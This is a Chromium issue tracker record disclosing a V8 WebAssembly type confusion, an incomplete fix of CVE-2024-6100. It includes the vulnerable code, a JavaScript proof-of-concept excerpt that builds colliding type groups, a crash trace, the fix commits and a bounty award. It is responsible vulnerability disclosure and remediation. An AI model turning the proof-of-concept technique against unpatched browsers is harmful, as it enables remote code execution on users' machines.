# Arbitrary WASM type confusion due to incomplete fix of CVE-2024-6100

| Field | Value |
|-------|-------|
| **Issue ID** | [360533914](https://issues.chromium.org/issues/360533914) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2024-6100 |
| **Reporter** | se...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2024-08-18 |
| **Bounty** | $55,000.00 |

## Description

### VULNERABILITY DETAILS

#### Summary

Arbitrary WASM type confusion due to incomplete fix of CVE-2024-6100, caused by `wasm::ValueType::HeapTypeField` index overflow.

#### Details

CVE-2024-6100 showed that we must not use `wasm::ValueType` to store canonical indices. However we are still using it to store canonical indices at [`wasm::TypeCanonicalizer::CanonicalizeValueType()`](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/canonical-types.cc;drc=7448e8cacb948a7be3c7b9b84c30310786332ce0;l=223) to canonicalize value types:

```
ValueType TypeCanonicalizer::CanonicalizeValueType(
    const WasmModule* module, ValueType type,
    uint32_t recursive_group_start) const {
  if (!type.has_index()) return type;
  return type.ref_index() >= recursive_group_start
             ? ValueType::CanonicalWithRelativeIndex(
                   type.kind(), type.ref_index() - recursive_group_start)
             : ValueType::FromIndex(
                   type.kind(),
                   module->isorecursive_canonical_type_ids[type.ref_index()]);  // [!]
}

```

This allows an attacker to canonicalize two different recursive groups into a single canonicalized recursive group with the same indices.

Note that since the `ValueType` constructor does not truncated the overflowed `HeapType`, this potentially results in setting `CanonicalRelativeField` to 1. An attacker can precisely create recursive groups as following (code from repro case `poc.html`):

```
let builder = new WasmModuleBuilder();
// target rec group
builder.startRecGroup();
builder.addStruct([makeField(wasmRefType(3), true)]);   // tidx 0, cidx 3 / field { (HeapTypeField 3, CanonicalRelativeField 1) = 0x100003 } 
builder.addArray(kWasmI32, true);                       // tidx 1, cidx 4
builder.addArray(kWasmI32, true);                       // tidx 2, cidx 5
builder.addStruct([makeField(kWasmExternRef, true)]);   // tidx 3, cidx 6 (ridx 3)
builder.endRecGroup();
let instance = builder.instantiate();   // total canon 7

reserve(1000000 - 7);                   // total canon 1000000
reserve(0x100003 - 1000000);            // total canon 0x1000003

builder = new WasmModuleBuilder();
let $s1 = builder.addStruct([makeField(kWasmI32, true)]);   // tidx 0, cidx 0x100003
// target rec group
builder.startRecGroup();
let $s2 = builder.addStruct([makeField(wasmRefType(4), true)]);     // tidx 1, cidx 3 / field { (HeapTypeField 3, CanonicalRelativeField 1) = 0x100003 } 
builder.addArray(kWasmI32, true);                                   // tidx 2, cidx 4
builder.addArray(kWasmI32, true);                                   // tidx 3, cidx 5
let $s3 = builder.addStruct([makeField(kWasmExternRef, true)]);     // tidx 4, cidx 6 (ridx 3)
builder.endRecGroup();
// rec group that canonicalizes into target rec group
builder.startRecGroup();
let $s4 = builder.addStruct([makeField(wasmRefType($s1), true)]);   // tidx 5, cidx 3? / field { (HeapTypeField 0x100003, CanonicalRelativeField 0) = 0x100003 } 
builder.addArray(kWasmI32, true);                                   // tidx 6, cidx 4?
builder.addArray(kWasmI32, true);                                   // tidx 7, cidx 5?
let $s5 = builder.addStruct([makeField(kWasmExternRef, true)]);     // tidx 8, cidx 6?
builder.endRecGroup();
// ...
let instance2 = builder.instantiate();

```

In the above example, we confuse an overflown `HeapTypeField` of value `0x100003` with `HeapTypeField` of value `3` together with `CanonicalRelativeField` value of `1`.

This can easily be exploited to cause arbitrary WASM type confusion. Exploitation with such primitives is trivial and has been presented multiple times. ([Pwn2Own Vancouver 2024](https://www.zerodayinitiative.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome), [TyphoonPWN 2024](https://ssd-disclosure.com/ssd-advisory-google-chrome-rce/), [v8CTF submission 8d4d57cb2258](https://issuetracker.google.com/issues/347145602), ...)

#### Bisect

Bug introduced by commit [cfa8d0b](https://chromiumdash.appspot.com/commit/cfa8d0b35acb42e79382004e0f1625d5ae1a7493) in M102 that introduces isorecursive canonicalization.

### VERSION

See bisect commit release info in Chromium Dash for more info: <https://chromiumdash.appspot.com/commit/cfa8d0b35acb42e79382004e0f1625d5ae1a7493>

Affects all Chrome builds with WasmGC available by default, which is M112 up to latest (M112 ~ M118 behind Origin Trials, later shipped in M119~). Note that some versions that backported [422cdc5](https://chromiumdash.appspot.com/commit/422cdc5eddcadb53b8eafb099722fb211a35739e) but not [2b43121](https://chromiumdash.appspot.com/commit/2b431212d6e813e31e6756627e6cd967d3b0a5b1) are not subject to the vulnerability as the maximum canonical index is capped to `kV8MaxWasmTypes`.

Chrome Version: M112 ~ latest (tested on 128.0.6613.36)  

Operating System: All

### REPRODUCTION CASE

Attached as `poc.html` which crashes the renderer trying to `console.log(fakeobj(1))`.

### FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

Type of crash: Renderer  

Crash State: Crashes within `console.log()` operation.

Note that the exact crash location is irrelevant as this is a side-effect of the exploit primitive `fakeobj(1)` caused by WASM type confusion.

#### Stack Trace

Crash state & symbolized stack trace just for the record. Symbolized via VS2022 debugger on Windows x86-64, Chrome 128.0.6613.36 Official Build (Early Stable / Beta).

```
chrome.dll!Builtins_ObjectToString()
chrome.dll!Builtins_ObjectPrototypeToString()
chrome.dll!Builtins_JSEntryTrampoline()
chrome.dll!Builtins_JSEntry()
chrome.dll!v8::internal::`anonymous namespace'::Invoke(v8::internal::Isolate * isolate, const v8::internal::`anonymous namespace'::InvokeParams & params) Line 438
	at C:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc(438)
chrome.dll!v8::internal::Execution::CallBuiltin(v8::internal::Isolate * isolate, v8::internal::Handle<v8::internal::JSFunction> builtin, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * argv) Line 530
	at C:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc(530)
chrome.dll!v8::Object::ObjectProtoToString(v8::Local<v8::Context> context) Line 4941
	at C:\b\s\w\ir\cache\builder\src\v8\src\api\api.cc(4941)
chrome.dll!v8_inspector::`anonymous namespace'::V8ValueStringBuilder::append(v8::Local<v8::Value> value, unsigned int ignoreOptions) Line 123
	at C:\b\s\w\ir\cache\builder\src\v8\src\inspector\v8-console-message.cc(123)
[Inline Frame] chrome.dll!v8_inspector::`anonymous namespace'::V8ValueStringBuilder::toString(v8::Local<v8::Value> value, v8::Local<v8::Context> context) Line 77
	at C:\b\s\w\ir\cache\builder\src\v8\src\inspector\v8-console-message.cc(77)
chrome.dll!v8_inspector::V8ConsoleMessage::createForConsoleAPI(v8::Local<v8::Context> v8Context, int contextId, int groupId, v8_inspector::V8InspectorImpl * inspector, double timestamp, v8_inspector::ConsoleAPIType type, v8::MemorySpan<const v8::Local<v8::Value>> arguments, const v8_inspector::String16 & consoleContext, std::__Cr::unique_ptr<v8_inspector::V8StackTraceImpl,std::__Cr::default_delete<v8_inspector::V8StackTraceImpl>> stackTrace) Line 461
	at C:\b\s\w\ir\cache\builder\src\v8\src\inspector\v8-console-message.cc(461)
chrome.dll!v8_inspector::`anonymous namespace'::ConsoleHelper::reportCall(v8_inspector::ConsoleAPIType type, v8::MemorySpan<const v8::Local<v8::Value>> arguments) Line 142
	at C:\b\s\w\ir\cache\builder\src\v8\src\inspector\v8-console.cc(142)
chrome.dll!v8_inspector::`anonymous namespace'::ConsoleHelper::reportCall(v8_inspector::ConsoleAPIType type) Line 78
	at C:\b\s\w\ir\cache\builder\src\v8\src\inspector\v8-console.cc(78)
chrome.dll!v8_inspector::V8Console::Log(const v8::debug::ConsoleCallArguments & info, const v8::debug::ConsoleContext & consoleContext) Line 253
	at C:\b\s\w\ir\cache\builder\src\v8\src\inspector\v8-console.cc(253)
chrome.dll!v8::internal::`anonymous namespace'::ConsoleCall(v8::internal::Isolate * isolate, const v8::internal::BuiltinArguments & args, void(v8::debug::ConsoleDelegate::*)(const v8::debug::ConsoleCallArguments &, const v8::debug::ConsoleContext &) func) Line 171
	at C:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-console.cc(171)
[Inline Frame] chrome.dll!v8::internal::Builtin_Impl_ConsoleLog(v8::internal::BuiltinArguments args, v8::internal::Isolate * isolate) Line 207
	at C:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-console.cc(207)
chrome.dll!v8::internal::Builtin_ConsoleLog(int args_length, unsigned __int64 * args_object, v8::internal::Isolate * isolate) Line 207
	at C:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-console.cc(207)
[External Code]
chrome.dll!v8::internal::`anonymous namespace'::Invoke(v8::internal::Isolate * isolate, const v8::internal::`anonymous namespace'::InvokeParams & params) Line 438
	at C:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc(438)
chrome.dll!v8::internal::Execution::CallScript(v8::internal::Isolate * isolate, v8::internal::Handle<v8::internal::JSFunction> script_function, v8::internal::Handle<v8::internal::Object> receiver, v8::internal::Handle<v8::internal::Object> host_defined_options) Line 517
	at C:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc(517)
chrome.dll!v8::Script::Run(v8::Local<v8::Context> context, v8::Local<v8::Data> host_defined_options) Line 2127
	at C:\b\s\w\ir\cache\builder\src\v8\src\api\api.cc(2127)
[Inline Frame] chrome.dll!blink::V8ScriptRunner::RunCompiledScript(v8::Isolate * isolate, v8::Local<v8::Script> script, v8::Local<v8::Data> host_defined_options, blink::ExecutionContext * context) Line 511
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\v8_script_runner.cc(511)
chrome.dll!blink::V8ScriptRunner::CompileAndRunScript(blink::ScriptState * script_state, blink::ClassicScript * classic_script, blink::ExecuteScriptPolicy policy, blink::V8ScriptRunner::RethrowErrorsOption rethrow_errors) Line 634
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\v8_script_runner.cc(634)
chrome.dll!blink::ClassicScript::RunScriptOnScriptStateAndReturnValue(blink::ScriptState * script_state, blink::ExecuteScriptPolicy policy, blink::V8ScriptRunner::RethrowErrorsOption rethrow_errors) Line 222
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\classic_script.cc(222)
[Inline Frame] chrome.dll!blink::Script::RunScriptOnScriptState(blink::ScriptState * script_state, blink::ExecuteScriptPolicy execute_script_policy, blink::V8ScriptRunner::RethrowErrorsOption rethrow_errors) Line 33
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\script.cc(33)
chrome.dll!blink::Script::RunScript(blink::LocalDOMWindow * window, blink::ExecuteScriptPolicy execute_script_policy, blink::V8ScriptRunner::RethrowErrorsOption rethrow_errors) Line 40
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\script.cc(40)
chrome.dll!blink::PendingScript::ExecuteScriptBlockInternal(blink::Script * script, blink::ScriptElementBase * element, bool was_canceled, bool is_external, bool created_during_document_write, base::TimeTicks parser_blocking_load_start_time, bool is_controlled_by_script_runner) Line 297
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\pending_script.cc(297)
chrome.dll!blink::PendingScript::ExecuteScriptBlock() Line 193
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\pending_script.cc(193)
chrome.dll!blink::ScriptLoader::PrepareScript(blink::ScriptLoader::ParserBlockingInlineOption parser_blocking_inline_option, const WTF::TextPosition & script_start_position) Line 1262
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\script_loader.cc(1262)
[Inline Frame] chrome.dll!blink::HTMLParserScriptRunner::ProcessScriptElementInternal(blink::Element * script, const WTF::TextPosition & script_start_position) Line 491
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\html_parser_script_runner.cc(491)
chrome.dll!blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element * script_element, const WTF::TextPosition & script_start_position) Line 285
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\html_parser_script_runner.cc(285)
[Inline Frame] chrome.dll!blink::HTMLDocumentParser::RunScriptsForPausedTreeBuilder() Line 678
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.cc(678)
[Inline Frame] chrome.dll!blink::HTMLDocumentParser::CanTakeNextToken(base::TimeDelta & time_executing_script) Line 192
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.h(192)
chrome.dll!blink::HTMLDocumentParser::PumpTokenizer() Line 748
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.cc(748)
chrome.dll!blink::HTMLDocumentParser::PumpTokenizerIfPossible() Line 643
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.cc(643)
chrome.dll!blink::HTMLDocumentParser::DeferredPumpTokenizerIfPossible(bool from_finish_append, base::TimeTicks schedule_time) Line 626
	at C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\parser\html_document_parser.cc(626)
[Inline Frame] chrome.dll!base::OnceCallback<void ()>::Run() Line 156
	at C:\b\s\w\ir\cache\builder\src\base\functional\callback.h(156)
[Inline Frame] chrome.dll!base::TaskAnnotator::RunTaskImpl(base::PendingTask & pending_task) Line 203
	at C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc(203)
[Inline Frame] chrome.dll!base::TaskAnnotator::RunTask(perfetto::StaticString event_name, base::PendingTask & pending_task, base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl::<lambda_4> && args) Line 90
	at C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h(90)
[Inline Frame] chrome.dll!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow * continuation_lazy_now) Line 484
	at C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc(484)
chrome.dll!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() Line 346
	at C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc(346)
chrome.dll!base::MessagePumpDefault::Run(base::MessagePump::Delegate * delegate) Line 41
	at C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc(41)
chrome.dll!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool application_tasks_allowed, base::TimeDelta timeout) Line 657
	at C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc(657)
chrome.dll!base::RunLoop::Run(const base::Location & location) Line 136
	at C:\b\s\w\ir\cache\builder\src\base\run_loop.cc(136)
chrome.dll!content::RendererMain(content::MainFunctionParams parameters) Line 367
	at C:\b\s\w\ir\cache\builder\src\content\renderer\renderer_main.cc(367)
chrome.dll!content::RunOtherNamedProcessTypeMain(const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char>> & process_type, content::MainFunctionParams main_function_params, content::ContentMainDelegate * delegate) Line 798
	at C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc(798)
chrome.dll!content::ContentMainRunnerImpl::Run() Line 1177
	at C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc(1177)
[Inline Frame] chrome.dll!content::RunContentProcess(content::ContentMainParams params, content::ContentMainRunner * content_main_runner) Line 333
	at C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc(333)
chrome.dll!content::ContentMain(content::ContentMainParams params) Line 346
	at C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc(346)
chrome.dll!ChromeMain(HINSTANCE__ * instance, sandbox::SandboxInterfaceInfo * sandbox_info, __int64 exe_entry_point_ticks, __int64 preread_begin_ticks, __int64 preread_end_ticks) Line 232
	at C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc(232)
[External Code]


```
### CREDIT INFORMATION

Reporter credit: Seunghyun Lee (@0x10n)

---

Full exploit coming soon...

## Attachments

- [poc.html](attachments/poc.html) (text/html, 86.9 KB)
- [exp.html](attachments/exp.html) (text/html, 96.7 KB)

## Timeline

### se...@gmail.com (2024-08-19)

Attached full exploit `exp.html` that pops `calc` from a `--no-sandbox` renderer. Tested on Windows x86-64, Chrome builds 128.0.6613.36 Official Build (Early Stable / Beta) and 129.0.6665.0 Official Build (Canary). Most of the latter parts regarding v8sbx escape are copied from [b/350292240](https://issues.chromium.org/issues/350292240) and [b/351327767](https://issues.chromium.org/issues/351327767).

### se...@gmail.com (2024-08-19)

As previously also explained in my TyphoonPWN submission, the patch would be to use and pass canonical type ids as a full `uint32_t` value, and stop abusing `wasm::ValueType` to represent canonical type ids **anywhere**.

### xi...@chromium.org (2024-08-19)

This is the bug that is associated with CVE-2024-6100: <https://crbug.com/344608204>. Setting severity the same as the original bug. +current V8 shepherd for further triage.

### sa...@google.com (2024-08-19)

Jakob, since you have some context from the other bug, could you take a look? As this is a variant, we should try to fix it as soon as possible. Thanks!

### cl...@appspot.gserviceaccount.com (2024-08-19)

Detailed Report: https://clusterfuzz.com/testcase?key=5079841703395328

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7a40adbeefc5
Crash State:
  v8::internal::Object::ObjectVerify
  v8::api_internal::GlobalizeReference
  v8_inspector::V8ConsoleMessage::createForConsoleAPI
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=1343371

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5079841703395328

Additional requirements: Requires HTTP

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### 24...@project.gserviceaccount.com (2024-08-19)

ClusterFuzz testcase 5079841703395328 appears to be flaky, updating reproducibility hotlist.

### se...@gmail.com (2024-08-19)

Note that confusing generic type indices with isorecursive type indices still work (as was also shown to be problematic in CVE-2024-6100), which does not involve overflowing `HeapTypeField` into `CanonicalRelativeField`.

### jk...@chromium.org (2024-08-19)

Yeah, I've also found this issue a few weeks ago, but haven't gotten around to fixing it yet. I'll add an `SBXCHECK` today as a quick fix. Longer-term we'll want a better scaling solution.

### jk...@chromium.org (2024-08-19)

Addendum to #9: I assumed that this was just a V8 sandbox escape (because that was the perspective from which I was auditing the code), I didn't realize that it could cause exploitable heap corruption as well.

### pe...@google.com (2024-08-19)

Setting milestone because of s0/s1 severity.

### ap...@google.com (2024-08-20)

Project: v8/v8
Branch: main

commit 79f3f1276efa17a6172a0923dd13436ad8337a86
Author: Jakob Kummerow <jkummerow@chromium.org>
Date:   Tue Aug 20 10:18:25 2024

    [wasm] Lower kMaxCanonicalTypes again
    
    This reverts part of 2b431212d6e813e31e6756627e6cd967d3b0a5b1,
    because there are still some ValueType uses of canonicalized
    type indices left. So for now we allow a maximum of 1'000'000
    canonicalized types.
    
    Fixed: 360533914
    Change-Id: I5041dc2190165781948b186f31cf02bdf894c1bb
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5797071
    Reviewed-by: Matthias Liedtke <mliedtke@chromium.org>
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#95710}

M       src/wasm/canonical-types.cc
M       src/wasm/value-type.h

https://chromium-review.googlesource.com/5797071


### pe...@google.com (2024-08-20)

This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M126. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
This is sufficiently serious that it should be merged to other stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M127. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M128. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.

### pe...@google.com (2024-08-21)

Merge review required: M128 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), obenedict (ChromeOS), pbommana (Desktop)

### pe...@google.com (2024-08-21)

Merge review required: M127 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), alonbajayo (ChromeOS), danielyip (Desktop)

### pe...@google.com (2024-08-21)

Merge review required: M126 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), ceb (ChromeOS), srinivassista (Desktop)

### am...@chromium.org (2024-08-22)

<https://crrev.com/c/5797071> approved for merges, please merge to 12.9 and 12.8 at your earliest convenience / before 10am Pacific on Monday 26 August -- thank you

### pe...@google.com (2024-08-26)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ap...@google.com (2024-08-26)

Project: v8/v8
Branch: refs/branch-heads/12.8

commit f9bb517557e58e56f8b5e636a12f4f3b4f7c026d
Author: Jakob Kummerow <jkummerow@chromium.org>
Date:   Tue Aug 20 10:18:25 2024

    Merged: [wasm] Lower kMaxCanonicalTypes again
    
    This reverts part of 2b431212d6e813e31e6756627e6cd967d3b0a5b1,
    because there are still some ValueType uses of canonicalized
    type indices left. So for now we allow a maximum of 1'000'000
    canonicalized types.
    
    Fixed: 360533914
    (cherry picked from commit 79f3f1276efa17a6172a0923dd13436ad8337a86)
    
    Change-Id: I8578d4b77233e7f3815dbf5ec6335f2c4cef963a
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5813422
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Reviewed-by: Matthias Liedtke <mliedtke@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.8@{#44}
    Cr-Branched-From: 70cbb397b153166027e34c75adf8e7993858222e-refs/heads/12.8.374@{#1}
    Cr-Branched-From: 451b63ed4251c2b21c56144d8428f8be3331539b-refs/heads/main@{#95151}

M       src/wasm/canonical-types.cc
M       src/wasm/value-type.h

https://chromium-review.googlesource.com/5813422


### ap...@google.com (2024-08-26)

Project: v8/v8
Branch: refs/branch-heads/12.9

commit 68c954406aa9d5c3a7cb182fed0751aa6767dc4f
Author: Jakob Kummerow <jkummerow@chromium.org>
Date:   Tue Aug 20 10:18:25 2024

    Merged: [wasm] Lower kMaxCanonicalTypes again
    
    This reverts part of 2b431212d6e813e31e6756627e6cd967d3b0a5b1,
    because there are still some ValueType uses of canonicalized
    type indices left. So for now we allow a maximum of 1'000'000
    canonicalized types.
    
    Fixed: 360533914
    (cherry picked from commit 79f3f1276efa17a6172a0923dd13436ad8337a86)
    
    Change-Id: I25f7d0e633856c1090753b96c14616d269722e2c
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5812964
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Reviewed-by: Matthias Liedtke <mliedtke@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.9@{#8}
    Cr-Branched-From: 64a21d7ad7fca1ddc73a9264132f703f35000b69-refs/heads/12.9.202@{#1}
    Cr-Branched-From: da4200b2cfe6eb1ad73c457ed27cf5b7ff32614f-refs/heads/main@{#95679}

M       src/wasm/canonical-types.cc
M       src/wasm/value-type.h

https://chromium-review.googlesource.com/5812964


### pe...@google.com (2024-08-26)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### sp...@google.com (2024-08-28)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $55000.00 for this report.

Rationale for this decision:
$55,000 for report of demonstrated RCE in a sandboxed process / renderer


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-08-29)

Congratulations Seunghyun -- very nice work! Your report was the first to qualify for RCE reward under the updated rewards. Thank you for your efforts and reporting this issue to us.

### se...@gmail.com (2024-08-29)

Honored to be the first :)  

Please donate the bounty to a charity of your choice, thanks!

### jk...@chromium.org (2024-08-29)

#21: M126 is not affected by this bug. Backmerging the patch doesn't hurt, but also isn't necessary.

### am...@chromium.org (2024-08-29)

re c#24:

> Honored to be the first :)
> Please donate the bounty to a charity of your choice, thanks!

Wowza! That's so generous Seunghyun.
We're happy to do this and on your behalf, and we'll double the amount being donated! (<https://g.co/chrome/vrps#reward-donation-option>)
I think we should donate this to the Ford Foundation's Spyware Accountability Initiative (<https://stopspyware.fund/>) -- how does that sound?

### se...@gmail.com (2024-08-29)

Sounds great!

### rz...@google.com (2024-08-30)

Labeled as LTS-NotApplicable for 120 and 126 as the issue was introduced after those milestones according to comments in the associated [bug 344608204](https://issues.chromium.org/issues/344608204)

### pe...@google.com (2024-11-27)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/360533914)*
